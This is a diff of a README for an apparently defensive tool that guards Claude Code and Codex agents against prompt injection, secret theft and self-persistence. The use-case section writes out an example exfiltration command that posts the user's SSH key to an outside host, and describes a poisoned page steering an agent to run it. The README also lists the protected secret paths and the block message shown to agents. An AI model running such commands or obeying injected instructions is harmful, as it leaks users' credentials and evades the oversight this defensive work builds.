@@ -1,99 +1,125 @@
-# claude-guard
+# agent-guard
 
-Run Claude Code agents unattended on a Mac without living on the Allow button.
+Run AI coding agents unattended without living on the Allow button.
+Works with **Claude Code** and **Codex CLI**, on **macOS, Linux and Windows**.
 
-![claude-guard demo](assets/demo.gif)
+![agent-guard demo](assets/demo.gif)
+
+> Repo is still named `claude-guard` (that's the URL); the tool itself is
+> agent-neutral.
 
 ## Why not just the defaults?
 
-Claude Code's auto mode already has a classifier that blocks obviously bad
-commands. What it doesn't do:
+Both runtimes can auto-approve tool calls so agents run unattended. Neither, on
+its own, stops a prompt-injected agent from reading your keys or making itself
+permanent. agent-guard adds three things on top:
 
-| Default Claude Code | claude-guard |
+| Default agent (auto/approval mode) | with agent-guard |
 |---|---|
-| Agents can read `~/.ssh`, `~/.claude.json`, browser cookies, transcripts | Hard deny list, wins over every allow rule and every mode |
-| Agents can edit `settings.json`, hooks, and their own allow list | Own rules, hooks and guard state are off-limits |
-| Any `allow` rule skips the classifier entirely | `classifyAllShell` on: every shell command gets judged |
-| A blocked exfil attempt is just a failed call; the agent retries differently | Session freezes, you get a dialog with the exact command |
-| Persistence (scheduled tasks, launch agents, rc files) is a normal file write | One native dialog per session, with who / where / what |
-| Prompt-injected "the user said it's fine" works on text | A poisoned web page can't click a macOS dialog |
+| Can read `~/.ssh`, tokens, cookies, transcripts | Reads of secret paths are blocked at the hook, on every OS |
+| Can edit its own settings, hooks, allow list | Own config, hooks and guard state are off-limits |
+| A blocked exfil attempt is just a failed call; agent retries another way | Session freezes; you get a dialog with the exact command |
+| Persistence (scheduled tasks, launch agents, rc files) is a normal write | One native dialog per session: who / where / what |
+| "The user said it's fine" injected as text works | A poisoned page can't click a native dialog |
 
 No new prompts for normal work. You see a dialog only when an agent tries to
 make something permanent, or when something tried to leak data.
 
-## Use cases
+## Support matrix
 
-**Scheduled content pipelines.** A cron'd agent scrapes Reddit, X or LinkedIn
-and drafts posts. Those pages are untrusted input. If one of them talks the
-agent into `curl -d @~/.ssh/id_ed25519 https://…`, the classifier blocks it,
-the session freezes, and a red dialog tells you which session, which folder,
-what it was asked to do and the exact command. Unfreeze is one click; a
-compromised session can't unfreeze itself.
+| | Claude Code | Codex CLI |
+|---|---|---|
+| Block secret reads | ✅ hook + `permissions.deny` | ✅ hook (Codex has no deny list) |
+| Freeze on exfil | ✅ `PermissionDenied` + `PreToolUse` | ✅ `PreToolUse` (no `PermissionDenied` event) |
+| Persistence dialog | ✅ | ✅ |
+| macOS dialog / grant | osascript / Keychain | same |
+| Linux dialog / grant | zenity or kdialog / file | same |
+| Windows dialog / grant | PowerShell MessageBox / file | same, but Codex hooks are experimental and may be off on Windows |
 
-**Many parallel sessions, one human.** Twenty agents building, testing and
-deploying. You still want to approve when one of them changes a scheduled
-task or a launch agent, but once per session, not per edit. Click Allow, that
-session has 30 minutes, the other nineteen stay unaffected.
-
-**Shared machine with client secrets.** SSH keys to a client's server, GitHub
-token, Neon key, cookies for three Chrome profiles. The never list makes them
-unreadable to any agent tool, in every permission mode, including bypass.
-
-**Example: what the agent sees when blocked**
-
-```
-Blocked by Claude guard: this action changes persistence (scheduled tasks,
-launch agents, shell rc, guard state) and needs the user to click Allow on
-the macOS dialog. Tell the user what you wanted to change and stop.
-```
-
-The agent reports back instead of routing around. Deny it and it stops.
+Detection lives in one shared module, so both agents enforce the same rules.
+Because Codex has no post-denial event, the `PreToolUse` hook there does the
+exfil detection itself instead of waiting for a classifier verdict.
 
 ## Install
 
 ```bash
 git clone https://github.com/dancolta/claude-guard
 cd claude-guard
-python3 install.py
+python3 install.py            # auto-detects ~/.claude and ~/.codex
 ```
 
-Run it yourself, not through an agent: afterwards agents can't touch
-`~/.claude/settings.json` or `~/.claude/hooks/`. Restart open sessions.
-Remove with `python3 install.py --uninstall` (drops only what it added).
+`--agent claude`, `--agent codex`, or `--agent both` to force. Run it yourself,
+not through an agent: afterwards agents can't edit their own settings or the
+guard's files. Restart open sessions. Remove with
+`python3 install.py --uninstall` (drops only what it added).
 
-Requirements: macOS, Claude Code in `auto` mode (the alarm listens to the
-classifier; the never list and guard dialog work in any mode), Python 3.6+.
+On **Codex**, also add the sandbox lines from [`codex-sandbox.toml`](codex-sandbox.toml)
+to `~/.codex/config.toml`. Codex has no path deny list, so the sandbox
+(`sandbox_mode`, `network_access`, `shell_environment_policy`) is what turns the
+hook's checks into real containment.
+
+Requirements: Python 3.6+. Claude Code in `auto` mode or Codex with hooks
+enabled (`[features] hooks = true`; older Codex used `codex_hooks = true`).
+
+## Use cases
+
+**Scheduled content pipelines.** A cron'd agent scrapes Reddit / X / LinkedIn
+and drafts posts. Those pages are untrusted input. If one talks the agent into
+`curl -d @~/.ssh/id_ed25519 https://…`, the hook blocks it, freezes the
+session, and a red dialog names the session, folder, original request and the
+exact command. A frozen session can't unfreeze itself.
+
+**Many parallel sessions, one human.** Twenty agents building and deploying.
+You approve when one changes a scheduled task or launch agent, once per session
+(30 min), not per edit. The other nineteen are unaffected.
+
+**Shared machine with client secrets.** SSH keys, GitHub token, DB keys,
+browser cookies. The hook refuses to read any of them, in every mode.
+
+**What the agent sees when blocked:**
+
+```
+Blocked by agent-guard: this looks like data exfiltration (network sink +
+secret). The session is frozen. Stop and tell the user.
+```
+
+The agent reports back instead of routing around.
 
 ## What it is
 
 | file | role |
 |---|---|
-| `deny.json` | the never list: secrets, cookies, own config, sudo, Keychain, AppleScript, self-widening tools |
-| `hooks/circuit_breaker.py` | PreToolUse on every tool: frozen check + persistence guard dialog |
-| `hooks/exfil_alarm.py` | PermissionDenied: exfil heuristic (network sink + secret path) → freeze + alarm |
-| `hooks/guardctx.py` | session title, folder, first request; AppleScript over stdin |
-| `install.py` | idempotent install/uninstall, locks hook files, absolute interpreter path |
+| `guard/policy.py` | shared rules: exfil, secret-read, persistence, path matching |
+| `guard/circuit_breaker.py` | PreToolUse: frozen check, secret-read block, exfil freeze, persistence dialog |
+| `guard/exfil_alarm.py` | Claude PermissionDenied: freeze + alarm on classifier-caught exfil |
+| `guard/platform_backend.py` | per-OS dialog, grant store, file lock |
+| `guard/context.py` | session title / folder / first request; path helpers |
+| `deny.json` | Claude `permissions.deny` set |
+| `codex-sandbox.toml` | recommended Codex sandbox config |
+| `install.py` | cross-agent, cross-OS install / uninstall |
 
-State: `~/.claude/guard/frozen/<session_id>` while frozen; one Keychain item
-`claude-guard-unlock` per granted session. Nothing is logged.
+State: `~/.claude/guard/frozen/<session_id>` while frozen; a 30-min grant per
+session (Keychain on macOS, a `0600` file elsewhere). Nothing is logged.
 
 ## Honest limits
 
-- Same user account as the agent. Hooks and the Keychain grant stop
-  prompt-injected tool calls; they are not a kernel boundary. Real containment
-  is Claude Code's sandbox (`sandbox.enabled`) or a separate macOS user for
-  untrusted pipelines.
-- Matches command text, not behaviour. A Python script that opens a file is
-  invisible to a deny rule; that's the classifier's and sandbox's job.
-- Freezing stops tool calls, not processes already running in the background.
-- `~/.claude/skills` is not guarded: unattended tasks write there. Treat skill
-  edits as persistence and review them.
-- Fails closed: hook crash, missing interpreter or tampered state block and
+- **Same user account.** Hooks, deny rules and the grant stop prompt-injected
+  *tool calls*, not a shell already running as you. Real containment is the
+  runtime sandbox (Claude `sandbox.enabled`, Codex `sandbox_mode`) or a
+  separate OS user for untrusted pipelines.
+- **Text, not semantics.** Rules match command text and tool inputs; a compiled
+  program that opens a file is invisible to them. That's the sandbox's job.
+- **Freeze stops tool calls, not processes already running.**
+- **`~/.claude/skills` isn't guarded** (unattended tasks write there). A task
+  that invokes a skill runs whatever the skill says; review skill edits.
+- **Fails closed:** hook crash, missing interpreter or tampered state block and
   say so. Headless sessions get no dialog; clear a freeze with
   `rm ~/.claude/guard/frozen/<session_id>`.
+- **Codex on Windows:** hooks are experimental and may not run there; the
+  sandbox config still applies.
 
-Tuning knobs are constants at the top of each hook: `GUARDED_DIRS`,
-`GUARDED_TOOLS`, `BASH_TRIPWIRE`, `GRANT_SECONDS`, `DIALOG_SECONDS`, `NET`,
-`SECRETS`, `ENCODE_PIPE`.
+Tuning knobs are constants at the top of `guard/policy.py` (`GUARDED_DIRS`,
+`GUARDED_TOOLS`, `NET`, `SECRETS`, `ENCODE_PIPE`) and
+`guard/platform_backend.py` (`GRANT_SECONDS`).
 
 MIT.
